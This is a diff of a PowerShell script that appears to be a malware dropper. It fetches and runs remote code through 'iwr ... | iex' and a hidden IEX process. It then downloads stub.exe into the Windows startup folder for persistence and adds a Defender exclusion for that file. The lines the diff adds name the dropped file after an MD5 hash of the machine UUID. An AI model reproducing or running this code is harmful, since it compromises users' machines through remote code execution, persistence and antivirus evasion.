@@ -136,9 +136,14 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
+
 $uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
+$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
+$uuid = $hash -replace "-",""
+
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\$uuid_update.exe"
+$output = "$startupfolder\$uuid__.exe"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
